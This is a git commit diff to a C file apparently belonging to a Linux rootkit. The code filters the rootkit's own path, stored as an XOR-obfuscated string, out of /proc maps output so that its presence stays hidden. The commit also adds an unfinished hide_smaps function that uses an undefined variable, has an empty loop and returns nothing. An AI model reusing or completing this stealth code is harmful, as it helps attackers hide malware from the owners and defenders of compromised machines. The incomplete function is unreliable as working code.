c6df96cf5083599ef2cb0d180609ec53e25fa2b1
b0ltzm4nn <113548315+xor-eax-eax-ret@users.noreply.github.com>
2023-11-27 21:00:58 -0500

    Cleaned up code

--- src/stealth/hide_maps.c
+++ src/stealth/hide_maps.c
@@ -5,12 +5,14 @@ int hide_maps(char *path) {
     char buf[8192];
 
     char *rk_home = strdup(RK_HOME); xor(rk_home);
-    FILE* tmp_fp = tmpfile(); 
+    FILE *tmp_fp = tmpfile(); 
     int maps_fd = syscall(2, path, O_RDONLY);
-    printf("%d\n", maps_fd);
-    FILE* maps_fp = fdopen(maps_fd, "r");
+
+    if (maps_fd == -1) return -1;
+    FILE *maps_fp = fdopen(maps_fd, "r");
+    if (!tmp_fp) return fileno(maps_fp);
+
     while (fgets(buf, sizeof(buf), maps_fp) != NULL) {
-        printf("%s\n", buf);
         if (!strstr(buf, rk_home)) {
             fputs(buf, tmp_fp);
         }
@@ -22,4 +24,21 @@ int hide_maps(char *path) {
     fseek(tmp_fp, 0, SEEK_SET);
     CLEAN(rk_home);
     return fileno(tmp_fp);
+}
+
+int hide_smaps(char *path) {
+    DEBUG_MSG("[-] hide_smaps() called\n");
+    char buf[8192];
+    
+    char *rk_home = strdup(RK_HOME); xor(rk_home);
+    FILE *tmp_fp = tmpfile(); 
+    int smaps_fd = syscall(2, path, O_RDONLY);
+    
+    if (smaps_fd == -1) return -1;
+    FILE *smaps_fp = fdopen(smaps_fd, "r");
+    if (!tmp_fp) return fileno(maps_fp);
+
+    while (fgets(buf, sizeof(buf), smaps_fp) != NULL) {
+
+    }
 }
